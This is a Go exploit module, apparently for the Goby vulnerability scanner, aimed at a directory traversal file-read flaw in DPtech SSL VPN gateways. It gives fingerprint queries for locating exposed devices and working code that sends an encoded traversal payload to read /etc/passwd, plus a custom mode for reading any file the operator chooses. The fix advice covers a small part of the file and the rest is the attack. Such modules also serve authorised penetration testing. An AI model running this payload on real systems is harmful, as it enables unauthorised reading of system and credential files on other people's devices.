package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "DPtech VPN File Read Vulnerability",
    "Description": "<p>DPtech VPN Intelligent Security Gateway is a professional security gateway product launched by DPtech Technology for wide-area interconnection applications. It integrates multiple VPN technologies such as IPSec, SSL, L2TP, and GRE, supports national cryptographic algorithms, and realizes unified secure access for branch offices and mobile office workers. It provides secure access to internal services across the Internet.</p><p>However, DPtech VPN has a directory traversal vulnerability, which allows attackers to read sensitive files on the server, leading to information disclosure.</p>",
    "Product": "DPtech VPN",
    "Homepage": "https://dpvpn.dptech.com/",
    "DisclosureDate": "2024-04-28",
    "PostTime": "2024-05-09",
    "Author": "兰公子",
    "FofaQuery": "header=\"Dptech server\" || body=\"application/x-dptech_ssl_vpn-mimetype\"",
    "GobyQuery": "header=\"Dptech server\" || body=\"application/x-dptech_ssl_vpn-mimetype\"",
    "Level": "1",
    "Impact": "<p>DPtech VPN has a directory traversal vulnerability, which allows attackers to read sensitive files on the server, leading to information disclosure.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,passwd",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/%00/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "迪普 SSL VPN 文件读取漏洞",
            "Product": "迪普 SSL VPN",
            "Description": "<p>DPtech VPN智能安全网关是迪普科技面向广域互联应用场景推出的专业安全网关产品，集成了IPSecQ、SSL、L2TP、GRE等多种VPN技术，支持国密算法，实现分支机构、移动办公人员的统一安全接入，提供内部业务跨互联网的安全访问。</p><p>DPtech VPN 存在目录穿越漏洞 ，攻击者通过该漏洞可以读取服务器敏感文件文件，造成信息泄露。</p>",
            "Recommendation": "<p>1、联系厂商获取修复漏洞措施</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>DPtech VPN 存在目录穿越漏洞 ，攻击者通过该漏洞可以读取服务器敏感文件文件，造成信息泄露。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "DPtech VPN File Read Vulnerability",
            "Product": "DPtech VPN",
            "Description": "<p>DPtech VPN Intelligent Security Gateway is a professional security gateway product launched by DPtech Technology for wide-area interconnection applications. It integrates multiple VPN technologies such as IPSec, SSL, L2TP, and GRE, supports national cryptographic algorithms, and realizes unified secure access for branch offices and mobile office workers. It provides secure access to internal services across the Internet.</p><p>However, DPtech VPN has a directory traversal vulnerability, which allows attackers to read sensitive files on the server, leading to information disclosure.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>DPtech VPN has a directory traversal vulnerability, which allows attackers to read sensitive files on the server, leading to information disclosure.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	postOrGet_adgTfgadfg := func(hostInfo *httpclient.FixUrl, fileUrl string, headerMap map[string]string) (string, error) {
		getRequest := func(hostInfo *httpclient.FixUrl, urlOfGet string, getHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
			getRequestConfigadgTfgadfg := httpclient.NewGetRequestConfig(urlOfGet)
			getRequestConfigadgTfgadfg.VerifyTls = false
			getRequestConfigadgTfgadfg.FollowRedirect = false
			if getHeaderMap != nil {
				for postHeaderKey, postHeaderValue := range getHeaderMap {
					getRequestConfigadgTfgadfg.Header.Store(postHeaderKey, postHeaderValue)
				}
			}
			return httpclient.DoHttpRequest(hostInfo, getRequestConfigadgTfgadfg)
		}

		resp, err := getRequest(hostInfo, fileUrl, headerMap)
		if err != nil {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.Utf8Html, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/%00/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/%00/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd": "root",
			}
			headerMap := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
			// 函数继承
			uploadFileFunc := postOrGet_adgTfgadfg

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl, headerMap)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/%00/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd", "root"},
			}
			headerMap := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_adgTfgadfg

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl, headerMap)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
